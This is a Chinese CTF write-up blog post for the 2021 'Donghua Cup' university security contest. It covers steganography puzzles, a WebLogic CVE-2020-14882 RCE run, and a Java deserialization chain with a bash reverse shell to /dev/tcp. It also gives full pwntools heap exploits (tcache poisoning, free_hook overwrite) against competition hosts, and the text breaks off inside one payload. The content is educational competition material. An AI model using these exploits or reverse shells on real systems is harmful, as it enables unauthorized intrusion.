@@ -1,0 +1,951 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>2021年全国大学生网络安全邀请赛暨第七届&#34;东华杯&#34;上海市大学生网络安全大赛Writeup | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="2021年全国大学生网络安全邀请赛暨第七届&#34;东华杯&#34;上海市大学生网络安全大赛Writeup | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="2021年全国大学生网络安全邀请赛暨第七届&quot;东华杯&quot;上海市大学生网络安全大赛Writeup
+Misc
+checkin
+题目给了+AGYAbABhAGcAewBkAGgAYgBfADcAdABoAH0- 是UTF-7编码，..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              2021年全国大学生网络安全邀请赛暨第七届&#34;东华杯&#34;上海市大学生网络安全大赛Writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-11-01
+              </span>
+              <span>
+                18 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="2021年全国大学生网络安全邀请赛暨第七届东华杯上海市大学生网络安全大赛writeup">2021年全国大学生网络安全邀请赛暨第七届&quot;东华杯&quot;上海市大学生网络安全大赛Writeup</h1>
+<h1 id="misc">Misc</h1>
+<h2 id="checkin">checkin</h2>
+<p>题目给了<code>+AGYAbABhAGcAewBkAGgAYgBfADcAdABoAH0-</code> 是UTF-7编码，解码得到flag</p>
+<figure data-type="image" tabindex="1"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/80550c299235c.png" alt="1635663455205.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>flag{dhb_7th}
+</code></pre>
+<h2 id="project">project</h2>
+<p>下载附件，解压之后发现这是道工控题目，但是解压之后里面有一个压缩包<code>problem_bak.zip</code></p>
+<figure data-type="image" tabindex="2"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/45eed4ebc336f.png" alt="1635663588027.png" loading="lazy"></figure>
+<p>解压得到<code>你来了~</code></p>
+<figure data-type="image" tabindex="3"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/0aaecf349d270.png" alt="1635663628463.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/cf718d950eed4.png" alt="1635663662815.png" loading="lazy"></figure>
+<p>这里面一共有三段数据，第一段是base64编码</p>
+<pre><code class="language-base64">6KGo5oOF5YyF5paH5YyW77yM5piv6ZqP552A572R57uc56S+5Lqk5rKf6YCa55qE5aKe5aSa5Ye6
+546w55qE5LiA56eN5Li75rWB5paH5YyW44CC5LiA5Liq5Lq655qE6KGo5oOF5YyF5piv5YW26ZqQ
+6JeP6LW35p2l55qE55yf5oiR77yM5LiA5Liq5Zu95a6255qE6KGo5oOF5YyF6YeM6IO955yL5Yiw
+6L+Z5Liq5Zu95a6255qE6KGo5oOF44CC4oCM4oCM4oCM4oCM4oCN4oCs4oCs4oCM5pyJ5pe25YCZ
+77yM6KGo5oOF5YyF6KGo6L6+55qE5piv5LiN6IO96YGT56C055qE55yf5a6e5oOz5rOV5ZKM5oSf
+5Y+X77yM6K+t6KiA5ZKM5paH5a2X55qE5bC95aS077yM5bCx5piv6KGo5oOF5YyF5pa95bGV55qE
+56m66Ze044CCDQrooajmg4XljIXmmK/nvZHnu5zor63oqIDnmoTkuIDnp43ov5vljJbvvIzlroPn
+moTkuqfnlJ/lkozmtYHooYzkuI7lhbbnibnlrprnmoTigJzigIzigIzigIzigIzigI3vu7/igI3i
+gI3nlJ/lrZjnjq/looPigJ3mnInlhbPjgILlhbbov73msYLphpLnm67jgIHmlrDlpYfjgIHosJDo
+sJHnrYnmlYjmnpznmoTnibnngrnvvIzigIzigIzigIzigIzigI3vu7/igIzigKzkuI7lubTovbvk
+urrlvKDmiazkuKrmgKflkozmkJ7mgKrnmoTlv4PnkIbnm7jnrKbigIzigIzigIzigIzigI3vu7/i
+gIzigKzjgIINCuihqOaDheWMheS5i+aJgOS7peiDveWkn+Wkp+iMg+WbtOWcsOS8oOaSre+8jOKA
+jOKAjOKAjOKAjOKAje+7v+KArOKAjeaYr+WboOS4uuWFtuW8peihpeS6huaWh+Wtl+S6pOa1geea
+hOaer+eHpeWSjOaAgeW6puihqOi+vuS4jeWHhuehrueahOW8seeCue+8jOacieaViOWcsOaPkOmr
+mOS6huayn+mAmuaViOeOh+OAgumDqOWIhuihqOaDheWMheWFt+acieabv+S7o+aWh+Wtl+eahOWK
+n+iDve+8jOKAjOKAjOKAjOKAjOKAje+7v+KAjeKAjei/mOWPr+S7peiKguecgeaJk+Wtl+aXtumX
+tOKAjOKAjOKAjOKAjOKAje+7v+KAjOKAjOOAgumaj+edgOaZuuiDveaJi+acuueahOWFqOmdouaZ
+ruWPiuWSjOekvuS6pOW6lOeUqOi9r+S7tueahOWkp+mHj+S9v+eUqO+8jOihqOaDheWMheW3sue7
+j+mrmOmikeeOh+WcsOWHuueOsOWcqOS6uuS7rOeahOe9kee7nOiBiuWkqeWvueivneW9k+S4reOA
+gg0K
+</code></pre>
+<p>解码得到：</p>
+<pre><code>表情包文化，是随着网络社交沟通的增多出现的一种主流文化。一个人的表情包是其隐藏起来的真我，一个国家的表情包里能看到这个国家的表情。‌‌‌‌‍‬‬‌有时候，表情包表达的是不能道破的真实想法和感受，语言和文字的尽头，就是表情包施展的空间。
+表情包是网络语言的一种进化，它的产生和流行与其特定的“‌‌‌‌‍﻿‍‍生存环境”有关。其追求醒目、新奇、谐谑等效果的特点，‌‌‌‌‍﻿‌‬与年轻人张扬个性和搞怪的心理相符‌‌‌‌‍﻿‌‬。
+表情包之所以能够大范围地传播，‌‌‌‌‍﻿‬‍是因为其弥补了文字交流的枯燥和态度表达不准确的弱点，有效地提高了沟通效率。部分表情包具有替代文字的功能，‌‌‌‌‍﻿‍‍还可以节省打字时间‌‌‌‌‍﻿‌‌。随着智能手机的全面普及和社交应用软件的大量使用，表情包已经高频率地出现在人们的网络聊天对话当中。
+
+</code></pre>
+<p>通过这解码得到的结果可以明显的观察到有隐藏字符</p>
+<figure data-type="image" tabindex="5"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/ddad08bc120ba.png" alt="1635677058506.png" loading="lazy"></figure>
+<p>通过解0宽字符得到<code>hurryup</code>，很明显这应该是某个地方的密钥，但现在暂时还未遇到，继续往下看</p>
+<p>在线解0宽字符的网址：https://330k.github.io/misc_tools/unicode_steganography.html</p>
+<figure data-type="image" tabindex="6"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/acb669e6685ea.png" alt="1635665832884.png" loading="lazy"></figure>
+<p>第二部分说了是<code>quoted-printable</code>加密，编码方式是，在线解密得到</p>
+<figure data-type="image" tabindex="7"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/94181f3bf3b33.png" alt="1635666046005.png" loading="lazy"></figure>
+<p>其中的文字是跟第一段base64的文字相吻合的。</p>
+<p>第三段说了是jpg图片，并且是base64加密的数据</p>
+<figure data-type="image" tabindex="8"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/4d48ed2fe3364.png" alt="1635666134319.png" loading="lazy"></figure>
+<p>这段base64数据是没有添加数据头的，自行补上<code>data:image/jpg;base64,</code>，然后转为图片得到这张图</p>
+<figure data-type="image" tabindex="9"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/3c73f71d6804c.png" alt="1635666259343.png" loading="lazy"></figure>
+<p>用010打开，发现图片结尾FF D9之后是有多余的数据的</p>
+<figure data-type="image" tabindex="10"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/3ad11142f628d.png" alt="1635666346736.png" loading="lazy"></figure>
+<p>最终发现是<code>OurSecret隐写</code>，因为用这个软件打开，如果图片不是<code>OurSecret隐写</code>，那么将不会显示数据大小的</p>
+<figure data-type="image" tabindex="11"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/b3662bbf98144.png" alt="1635666461413.png" loading="lazy"></figure>
+<p>这里显示了数据的大小，也就证实了是<code>OurSecret隐写</code>，密钥就是第一段0宽解密出来得到的<code>hurryup</code></p>
+<figure data-type="image" tabindex="12"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/049f1dc4ce9f1.png" alt="1635666548934.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/dcf34c53a10da.png" alt="1635666561713.png" loading="lazy"></figure>
+<p>所以flag为：</p>
+<pre><code>flag{f3a5dc36-ad43-d4fa-e75f-ef79e2e28ef3}
+</code></pre>
+<h2 id="jumpjumptiger">JumpJumpTiger</h2>
+<p>jump.exe打开ida，查看到hint</p>
+<pre><code class="language-python">int  main(int argc, const char **argv, const char **envp)
+{
+	int v4[100]; // [rsp+20h] [rbp-60h]
+	int v5[101]; // [rsp+1B0h] [rbp+130h]
+	int v6; // [rsp+344h] [rbp+2C4h]
+	int v7; // [rsp+348h] [rbp+2C8h]
+	int i; // [rsp+34Ch] [rbp+2CCh]
+
+	printf(&quot;This is your hint!!!&quot;);
+	v7 = 0;
+	v6 = 0;
+	for (i = 0; i &lt;= 99; ++i)
+	{
+		if (i &amp; 1)
+			v4[v6++] = i;
+		else
+			v5[v7++] = i;
+	}
+	return 0;
+}
+</code></pre>
+<p>大致意思，奇偶分离。</p>
+<p>查看jump.exe内码，发现大量疑似base64编码，直接提取</p>
+<pre><code>/i9VjB/O4RAwA0QKSGkgZoJARAgAAABNASQUEhAEAUQgAABAABA4DA/A2AwABQD4ACAAUIDABAAAQBEnAswVUYEUBAAAQAFgBAQEUlGEBQwVwRI4BAwWcTHBBQwZ8YLsC5w5kaMcE1Q88/SsEuhCEcPAEURvEOTfFFhdwUXiERx8QBaaFaRqEtRBGsCtE7YNG+hI08dZHIxx8xfIE6xtcbiSJ3CvIrevJ/B/wWe/H9xA7f/Q2NwkBnDbAJQJUJFsBXQ9ccG1BMw74aIBCtAr4veLFQBxEKU/HShZ4ee3HChm4xefHYhk4CeAH/hN42eqHrhT...共八百万字符
+</code></pre>
+<p>直接尝试奇偶分离</p>
+<pre><code class="language-python">file = open(&quot;in.txt&quot;)
+file2 = open(&quot;out.txt&quot;,&quot;r+&quot;)
+for line in file:
+    tmp = line
+    print(tmp)
+    s = ''
+    for i in range(len(tmp)):
+        if i &amp; 2 == 1:
+        #if i % 2 == 1:
+            s += tmp[i]
+    file2.write(s)
+    print(len(s))
+</code></pre>
+<p>刚好拿到两串base64编码均以=号结尾</p>
+<pre><code>/9j/4AAQSkZJRgABAQEAAQABAAD/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/2wBDAQUFBQcGBw4ICA4eFBEUHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh7/wAARCAQ4B4ADAREAAhEBAxEB/8QAHQAAAgIDAQEBAAAAAAAAAAAAAQIAAwQFBgcICf/EAEUQAQABAwMDAwMDAwMDAwECDwECAAMRBBIhBTFBBiJR...共四百万字符
+</code></pre>
+<p>分别解码，得到了一张jpg和一张png，两张图片看起来是一样的，很明显就是盲水印了，直接使用命令：</p>
+<pre><code>python bwmforpy3.py decode 2.jpg 2.png flag.png
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/c492ff3633481.png" alt="1635678672181.png" loading="lazy"></figure>
+<p>得到flag.png，打开即能看到flag</p>
+<figure data-type="image" tabindex="15"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/8e6f5dac287cc.png" alt="1635678709311.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>flag{72f73bbe-9193-e59a-c593-1b1cb8f76714}
+</code></pre>
+<h1 id="web">Web</h1>
+<h2 id="apacheproxy">apacheprOxy</h2>
+<p>打开附件，发现这是Weblogic</p>
+<figure data-type="image" tabindex="16"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/b9bf6ddf2058b.png" alt="1635692411817.png" loading="lazy"></figure>
+<p>Weblogic有一个cve-2020-14882远程命令执行漏洞，GitHub上有现成的exp</p>
+<p>EXP地址：https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2020-14882_rce.py</p>
+<p>因为开了反代，直接访问就进了i春秋官网了，抓个包获取一下真实的题目环境地址</p>
+<figure data-type="image" tabindex="17"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/e654e1ac42341.png" alt="1635672298386.png" loading="lazy"></figure>
+<p>使用命令:</p>
+<pre><code>python 1.py -u &quot;http://47.104.100.25:7410/&quot; -c &quot;ls /&quot;
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/29658a8f22d6f.png" alt="1635667546539.png" loading="lazy"></figure>
+<p>然后直接cat /flag：</p>
+<pre><code>python 1.py -u &quot;http://47.104.100.25:7410/&quot; -c &quot;cat /flag&quot;
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/06370319fceef.png" alt="1635667630737.png" loading="lazy"></figure>
+<p>所以flag为：</p>
+<pre><code>flag{da77ef49-5958-40d5-b426-664b8299e576}
+</code></pre>
+<h2 id="ezgadget">EzGadget</h2>
+<p>开始审计，IndexController.java</p>
+<pre><code>.....
+ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
+        String name = objectInputStream.readUTF();
+        int year = objectInputStream.readInt();
+        if (name.equals(&quot;gadgets&quot;) &amp;&amp; year == 2021) {
+            objectInputStream.readObject();
+        }
+.....
+</code></pre>
+<p>绕过这里再输出流再</p>
+<pre><code>oos.writeUTF(&quot;gadgets&quot;);
+oos.writeInt(2021);
+</code></pre>
+<p>就好了</p>
+<p>ToStringBean.java</p>
+<pre><code>public String toString() {
+        ToStringBean toStringBean = new ToStringBean();
+        Class clazz = toStringBean.defineClass((String)null, this.ClassByte, 0, this.ClassByte.length);
+        Object var3 = null;
+
+        try {
+            var3 = clazz.newInstance();
+        } catch (InstantiationException var5) {
+            var5.printStackTrace();
+        } catch (IllegalAccessException var6) {
+            var6.printStackTrace();
+        }
+
+        return &quot;enjoy it.&quot;;
+    }
+</code></pre>
+<p>可以看到加载了字节码，这里加载字节码的函数是toString，cc5链的BadAttributeValueExpException的readobject方法正好调用了toString，该类是jdk自带的，并且参数可控</p>
+<figure data-type="image" tabindex="20"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/e7b81045cdc41.png" alt="1635690479241.png" loading="lazy"></figure>
+<pre><code>import com.ezgame.ctf.tools.ToStringBean;
+import ezgame.ctf.bean.User;
+
+
+import javax.management.BadAttributeValueExpException;
+import java.io.IOException;
+import java.io.InputStream;
+import java.lang.reflect.Field;
+
+public class exp {
+    public static void main(String[] args) throws Exception {
+        InputStream inputStream = evil.class.getResourceAsStream(&quot;evil.class&quot;);
+        byte[] bytes = new byte[inputStream.available()];
+        inputStream.read(bytes);
+
+        ToStringBean sie =new ToStringBean();
+        Field bytecodes = Reflections.getField(sie.getClass(),&quot;ClassByte&quot;);
+        Reflections.setAccessible(bytecodes);
+        Reflections.setFieldValue(sie,&quot;ClassByte&quot;,bytes);
+
+        BadAttributeValueExpException exception = new BadAttributeValueExpException(&quot;exp&quot;);
+        Reflections.setFieldValue(exception,&quot;val&quot;,sie);
+				String a=Serialize.serialize(exception);
+        System.out.print(a);
+
+    }
+}
+
+</code></pre>
+<p>加载的字节码类</p>
+<pre><code>class exp{
+
+static {
+try {
+	Runtime.getRuntime().exec(&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1'&quot;);
+	}
+	catch(){
+	}
+}
+
+}
+</code></pre>
+<p>这里进一下if</p>
+<pre><code>writeUTF(&quot;gadgets&quot;);
+writeInt(2021);
+</code></pre>
+<p>生成的payload可以直接打，之后vps监听收到反弹的shell</p>
+<figure data-type="image" tabindex="21"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/b01b58a290244.png" alt="1635692065245.png" loading="lazy"></figure>
+<h1 id="pwn">Pwn</h1>
+<h2 id="cpp1">cpp1</h2>
+<p>2.31 漏洞点在edit里 ，可以造成溢出<br>
+用0x80的chunk填满tcache后 溢出打size<br>
+造成堆快重叠，并且释放重叠的堆块进unsortedbin<br>
+然后show出libc 后面就正常的tcache attack 溢出打freehook为system getshell</p>
+<p>Exp如下：</p>
+<pre><code class="language-python">from pwn import*
+
+context.log_level = &quot;debug&quot;
+
+#io = process(&quot;./pwn&quot;)
+io = remote(&quot;47.104.143.202&quot;,&quot;43359&quot;)
+
+def menu(choice):
+	io.sendlineafter(&quot;&gt;&gt;&quot;,str(choice))
+
+def add(index,size):
+	menu(1)
+	io.sendlineafter(&quot;&gt;&gt;&quot;,str(index))
+	io.sendlineafter(&quot;&gt;&gt;&quot;,str(size))
+
+def edit(index,content):
+	menu(2)
+	io.sendlineafter(&quot;&gt;&gt;&quot;,str(index))
+	io.sendlineafter(&quot;&gt;&gt;&quot;,content)
+
+def show(index):
+	menu(3)
+	io.sendlineafter(&quot;&gt;&gt;&quot;,str(index))
+
+def delete(index):
+	menu(4)
+	io.sendlineafter(&quot;&gt;&gt;&quot;,str(index))
+
+def look():
+	global io
+	gdb.attach(io)
+
+for i in range(0,7):
+	add(i,0x80)
+
+add(7,0x18)
+add(8,0x50)
+add(9,0x20)
+add(10,0x30)
+
+edit(7,b&quot;a&quot;*0x10 + p64(0) + b&quot;\x91&quot;)
+
+for i in range(0,7):
+	delete(i)
+
+delete(8)
+
+for i in range(0,7):
+	add(i,0x80)
+
+add(8,0x50)
+show(9)
+
+info = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))
+malloc_hook = info - 96 - 0x10
+libc = ELF(&quot;./libc-2.31.so&quot;)
+libc_base = malloc_hook - libc.sym[&quot;__malloc_hook&quot;]
+free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]
+success(&quot;free_hook:&quot;+hex(free_hook))
+system = libc_base + libc.sym[&quot;system&quot;]
+
+add(11,0x20)
+
+add(12,0x18)
+add(13,0x18)
+add(14,0x18)
+
+delete(12)
+delete(14)
+edit(13,p64(0)*3 + p64(0x21) + p64(free_hook))
+
+add(14,0x18)
+add(15,0x18)
+
+edit(15,p64(system))
+edit(14,&quot;/bin/sh\x00&quot;)
+
+delete(14)
+
+io.interactive()
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/3b0e8a0fd8edc.png" alt="1635684581516.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>flag{96f7801e4e658271915cf5ab3aa26ee6}
+</code></pre>
+<h2 id="bg3">bg3</h2>
+<p>泄露libc：因为可以申请大chunk，于是<br>
+释放一个&gt;0x420chunk 进unsortedbin 然后申请回来 直接show得到libc<br>
+get shell ： 漏洞点在add里面 相同index的size可以叠加<br>
+于是通过溢出打free_hook为system get shell</p>
+<p>Exp如下：</p>
+<pre><code class="language-python">from pwn import*
+
+context.log_level = &quot;debug&quot;
+
+io = remote(&quot;47.104.143.202&quot;,&quot;25997&quot;)
+#io = process(&quot;./pwn&quot;)
+
+def menu(choice):
+	io.sendlineafter(&quot;Select:&quot;,str(choice))
+
+def add(index,size): 
+	menu(1)
+	io.sendlineafter(&quot;Index:&quot;,str(index))
+	io.sendlineafter(&quot;:&quot;,str(size))
+
+def edit(index,content):
+	menu(2)
+	io.sendlineafter(&quot;Index:&quot;,str(index))
+	io.sendlineafter(&quot;BugInfo:&quot;,content)
+
+def show(index):
+	menu(3)
+	io.sendlineafter(&quot;Index:&quot;,str(index))
+
+def delete(index):
+	menu(4)
+	io.sendlineafter(&quot;Index:&quot;,str(index))
+
+def look():
+	global io
+	gdb.attach(io)
+
+add(0,0x420)
+add(1,0x18)
+delete(0)
+add(0,0x420)
+show(0)
+info = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))
+print(hex(info))
+libc = ELF(&quot;./libc-2.31.so&quot;,checksec = 0)
+malloc_hook = info - 96 - 0x10
+libc_base = malloc_hook - libc.sym[&quot;__malloc_hook&quot;]
+system = libc_base + libc.sym[&quot;system&quot;]
+free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]
+
+add(2,0x18) #fuck!
+delete(2)
+add(2,0x18)
+delete(2)
+add(2,0x18)
+delete(2)
+add(2,0x18)
+
+add(3,0x18)
+add(4,0x18)
+delete(4)
+delete(3)
+edit(2,p64(0)*4 + p64(free_hook))
+add(5,0x18)
+add(6,0x18)
+edit(6,p64(system))
+edit(5,b&quot;/bin/sh\x00&quot;)
+delete(5)
+
+io.interactive()
+</code></pre>
+<figure data-type="image" tabindex="23"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/e4d2f5e496a5c.png" alt="1635680900182.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>flag{7240aca686aa4bc4d7697b2d7b5c7655}
+</code></pre>
+<h2 id="gcc2">gcc2</h2>
+<p>漏洞点在Remove里，有uaf。<br>
+leak_libc : 通过uaf首先泄露堆地址<br>
+然后改tcache的fd指针指向原本地址+0x10处<br>
+再申请回来时，可以造成堆快向下的0x10溢出，溢出改size为0xe1<br>
+然后对0xe1的chunk进行edit绕过double free check<br>
+把该chunk释放7次进tcache中<br>
+再释放一次 进入unsortedbin show得到libc<br>
+最后利用uaf直接tcache attack打free_hook为system get shell.</p>
+<pre><code class="language-python">from pwn import*
+
+context.log_level = &quot;debug&quot;
+
+#io = process(&quot;./pwn&quot;)
+io = remote(&quot;47.104.143.202&quot;,&quot;15348&quot;)
+
+def menu(choice):
+	io.sendlineafter(&quot;&gt;&gt;&quot;,str(choice))
+
+def add(index,size):
+	menu(1)
+	io.sendlineafter(&quot;&gt;&gt;&quot;,str(index))
+	io.sendlineafter(&quot;&gt;&gt;&quot;,str(size))
+
+def edit(index,content):
+	menu(2)
+	io.sendlineafter(&quot;&gt;&gt;&quot;,str(index))
+	io.sendlineafter(&quot;&gt;&gt;&quot;,content)
+
+def show(index):
+	menu(3)
+	io.sendlineafter(&quot;&gt;&gt;&quot;,str(index))
+
+def delete(index):
+	menu(4)
+	io.sendlineafter(&quot;&gt;&gt;&quot;,str(index))
+
+def look():
+	global io
+	gdb.attach(io)
+
+add(0,0x60)
+add(1,0x60)
+add(2,0x60)
+add(3,0x60)
+add(4,0x18)
+
+delete(1)
+edit(1,p64(0)+p64(0x71))
+delete(0)
+show(0)
+io.recvuntil(&quot;\n&quot;)
+chunk_addr = u64(io.recv(6).ljust(8,b'\x00'))
+print(hex(chunk_addr))
+fake_addr = chunk_addr + 0x10
+print(hex(fake_addr))
+edit(0,p64(fake_addr))
+
+add(5,0x60)
+add(6,0x60)
+edit(6,b&quot;a&quot;*0x58 + b&quot;\xe1&quot;)
+
+for i in range(0,7):
+	edit(2,p64(0)*2)
+	delete(2)
+
+edit(2,p64(0)*2)
+delete(2)
+show(2)
+info = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))
+print(hex(info))
+
+libc = ELF(&quot;./libc-2.31.so&quot;,checksec = 0)
+malloc_hook = info - 96 - 0x10
+libc_base = malloc_hook - libc.sym[&quot;__malloc_hook&quot;] 
+free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]
+system =  libc_base + libc.sym[&quot;system&quot;]
+
+add(9,0x18)
+add(10,0x18)
+delete(9)
+delete(10)
+edit(10,p64(free_hook))
+add(11,0x18)
+add(12,0x18)
+
+edit(12,p64(system))
+add(13,0x18)
+edit(13,b&quot;/bin/sh\x00&quot;)
+delete(13)
+io.interactive()
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/10/31/282cc9566dff4.png" alt="1635687376604.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>flag{c9749ef8cbfdc4fc56542daea489a71c}
+</code></pre>
+<h2 id="boom_script">boom_script</h2>
+<p>这题是c解释器有关的题，正好前一段时间有师傅给我发了类似的题，这题是uaf的漏洞，通过字符串的变换可以进行堆块的申请与释放，来进行泄露和getshell</p>
+<p>Exp：</p>
+<pre><code class="language-python">from pwn import*
+
+context.log_level = &quot;debug&quot;
+
+#io = process(&quot;./boom_script&quot;)
+io = remote(&quot;47.104.143.202&quot;,&quot;41299&quot;)
+
+def look():
+	global io
+	gdb.attach(io)
+
+def shell(payload):
+
+	io.recvuntil(&quot;$&quot;)
+	io.sendline(str(1))
+	io.recvuntil('length:')
+	io.sendline(str(len(payload)))
+	io.recvuntil('code:')
+	io.send(payload)
+
+
+def main():
+	#the code to leak main_arena + offset and to fuck the libc
+	payload=&quot;&quot;&quot;
+    a=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa